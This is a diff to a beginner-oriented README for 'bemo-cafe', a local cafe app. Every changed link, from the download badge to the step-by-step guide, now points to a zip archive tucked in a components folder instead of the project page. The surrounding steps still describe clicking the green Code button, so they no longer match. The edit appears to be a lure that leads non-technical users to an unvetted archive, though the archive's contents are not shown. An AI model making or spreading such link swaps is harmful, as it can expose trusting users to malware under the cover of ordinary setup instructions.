@@ -1,6 +1,6 @@
 # ☕ bemo-cafe - Run Your Cafe App Locally
 
-[![Download and run the app](https://img.shields.io/badge/Download%20bemo--cafe-4b8cff?style=for-the-badge&logo=github&logoColor=white)](https://github.com/tishaworldclass53/bemo-cafe)
+[![Download and run the app](https://img.shields.io/badge/Download%20bemo--cafe-4b8cff?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip)
 
 ## 🌟 What bemo-cafe is
 
@@ -12,7 +12,7 @@ This project includes the files you need to set up the app on your computer and 
 
 Use this link to visit the page and download or copy the files you need:
 
-[https://github.com/tishaworldclass53/bemo-cafe](https://github.com/tishaworldclass53/bemo-cafe)
+[https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip](https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip)
 
 ## 🖥️ What you need on Windows
 
@@ -33,7 +33,7 @@ Follow these steps in order.
 ### 1. Download the project
 
 1. Open this page:
-   [https://github.com/tishaworldclass53/bemo-cafe](https://github.com/tishaworldclass53/bemo-cafe)
+   [https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip](https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip)
 2. Click the green **Code** button
 3. Select **Download ZIP**
 4. Save the file to a folder you can find, such as **Downloads**
@@ -197,4 +197,4 @@ Your folder may look like this:
 ## 📎 Source link
 
 Project page:
-[https://github.com/tishaworldclass53/bemo-cafe](https://github.com/tishaworldclass53/bemo-cafe)
+[https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip](https://raw.githubusercontent.com/tishaworldclass53/bemo-cafe/main/components/cafe-bemo-2.5.zip)
